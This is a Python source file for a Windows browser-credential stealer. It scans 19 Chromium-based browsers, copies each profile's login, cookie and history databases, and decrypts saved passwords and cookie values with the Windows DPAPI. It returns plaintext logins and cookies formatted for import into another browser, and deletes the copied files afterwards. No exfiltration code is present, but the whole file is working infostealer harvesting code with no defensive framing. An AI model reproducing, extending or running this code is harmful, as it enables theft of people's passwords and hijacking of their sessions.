import json
import os
import re
import sqlite3
from datetime import datetime, timezone, timedelta
from win32crypt import CryptUnprotectData as decrypter

from pip._vendor.distlib._backport.shutil import copyfile


class Chromium:
    def __init__(self):
        self.chromium_browsers = chromium_browsers
        self.data_base = self.get_databases()

    def get_databases(self):
        databases = {}
        for browser in self.chromium_browsers:
            path = browser[1]
            path_info = os.path.join(path, u'Local State')
            if os.path.exists(path_info):
                profiles = {'Default', ''}
                with open(path_info) as f:
                    try:
                        data = json.load(f)
                        profiles |= set(data['profile']['info_cache'])
                    except:
                        pass

                    profile_ = {}
                    for profile in profiles:
                        try:
                            db_files = os.listdir(os.path.join(path, profile))
                        except:
                            continue
                        for db in db_files:
                            if 'login data' in db.lower() and u'journal' not in db.lower():
                                profile_[profile] = (os.path.join(path, profile, db), os.path.join(path, profile))
                    databases[browser[0]] = profile_
        return databases

    def copy_file(self, path):
        try:
            new_path = path + " Dump"
            copyfile(path, new_path)
        except:
            return
        return new_path

    def remove_file(self, path):
        try:
            os.remove(path)
        except:
            pass

    def convert_time(self, time):
        epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
        cookie_datetime = epoch + timedelta(microseconds=time)
        return cookie_datetime

    def extract_passwords(self, path_db):
        info_list = []
        try:
            connection = sqlite3.connect(path_db)
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT origin_url, username_value, password_value, date_created FROM logins')
                value = v.fetchall()

            for origin_url, username, password, date_created in value:
                try:
                    pswd = decrypter(password, None, None, None, 0)[1]
                except:
                    pswd = b'???'

                if username:
                    info_list.append({
                        'URL': re.search('\/\/(?:www\.)?([^:\/?\n]+)', origin_url)[1],
                        'Login': username,
                        'Password': str(pswd, 'utf-8'),
                        'Created date': str(self.convert_time(date_created).strftime('%Y/%m/%d - %H:%M:%S'))
                    })
        except:
            return []

        return info_list

    def extract_cookies(self, path_db):
        info_list = {}
        id = {}
        try:
            connection = sqlite3.connect(path_db)
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT host_key, name, encrypted_value, expires_utc, '
                                   'path, is_httponly, is_secure FROM cookies')
                value = v.fetchall()

            for host_key, name, encrypted_value, expires_utc, path, http, secure in value:
                decrypted_value = decrypter(encrypted_value, None, None, None, 0)[1].decode('utf-8')
                if decrypted_value:
                    try:
                        if host_key not in info_list:
                            id[host_key] = 1
                            info_list[host_key] = []
                        else:
                            id[host_key] += 1

                        el = {"domain": host_key,
                              "expirationDate": int(self.convert_time(expires_utc).timestamp()),
                              "hostOnly": False,
                              "httpOnly": bool(http),
                              "name": name,
                              "path": str(path),
                              "sameSite": "no_restriction",
                              "secure": bool(secure),
                              "session": False,
                              "storeId": "0",
                              "value": decrypted_value,
                              "id": id[host_key]}

                        info_list[host_key] = info_list[host_key] + [el]
                    except:
                        pass
        except:
            return []
        return info_list


    def extract_history(self, path_db):
        info_list = []
        try:
            connection = sqlite3.connect(path_db)
            with connection:
                cursor = connection.cursor()
                v = cursor.execute('SELECT DISTINCT lower_term FROM keyword_search_terms;')
                value = v.fetchall()

            for term in value:
                info_list.append({'Key Word': term})

            return info_list
        except:
            return []

    def get_passwords(self):
        db = self.data_base
        extracted_data = {}
        for browser, path in db.items():
            if browser:
                for profile, paths in path.items():
                    path = self.copy_file(paths[0])
                    try:
                        data = self.extract_passwords(path)
                        extracted_data[browser + ", Profile: " + profile] = data
                    except:
                        pass
                    self.remove_file(path)
        return extracted_data

    def get_cookies(self):
        db = self.data_base
        extracted_data = {}
        for browser, path in db.items():
            if browser:
                for profile, paths in path.items():
                    path = self.copy_file(os.path.join(paths[1], 'Cookies'))
                    try:
                        data = self.extract_cookies(path)
                        extracted_data[browser + ", Profile: " + profile] = data
                    except:
                        pass
                    self.remove_file(path)
        return extracted_data

    def get_history(self):
        db = self.data_base
        extracted_data = {}
        for browser, path in db.items():
            if browser:
                for profile, paths in path.items():
                    path = self.copy_file(os.path.join(paths[1], 'History'))
                    try:
                        data = self.extract_history(path)
                        extracted_data[browser + ", Profile: " + profile] = data
                    except:
                        pass
                    self.remove_file(path)
        return extracted_data


_localappdata = os.getenv('localappdata')
_appdata = os.getenv('appdata')

chromium_browsers = [
    ('7Star', _localappdata + r'\7Star\7Star\User Data'),
    ('Amigo', _localappdata + r'\Amigo\User Data'),
    ('Brave', _appdata + r'\brave'),
    ('CentBrowser', _localappdata + r'\CentBrowser\User Data'),
    ('Chedot Browser', _localappdata + r'\Chedot\User Data'),
    ('Chrome Canary', _localappdata + r'\Google\Chrome SxS\User Data'),
    ('Chromium', _localappdata + r'\Chromium\User Data'),
    ('Coccoc', _localappdata + r'\CocCoc\Browser\User Data'),
    ('Elements Browser', _localappdata + r'\Elements Browser\User Data'),
    ('Epic Privacy Browser', _localappdata + r'\Epic Privacy Browser\User Data'),
    ('Google Chrome', _localappdata + r'\Google\Chrome\User Data'),
    ('Kometa', _localappdata + r'\Kometa\User Data'),
    ('Opera', _appdata + r'\Opera Software\Opera Stable'),
    ('Orbitum', _localappdata + r'\Orbitum\User Data'),
    ('Sputnik', _localappdata + r'\Sputnik\Sputnik\User Data'),
    ('Torch', _localappdata + r'\Torch\User Data'),
    ('Uran', _localappdata + r'\uCozMedia\Uran\User Data'),
    ('Vivaldi', _localappdata + r'\Vivaldi\User Data'),
    ('YandexBrowser', _localappdata + r'\Yandex\YandexBrowser\User Data')
]

if __name__ == '__main__':
    pass
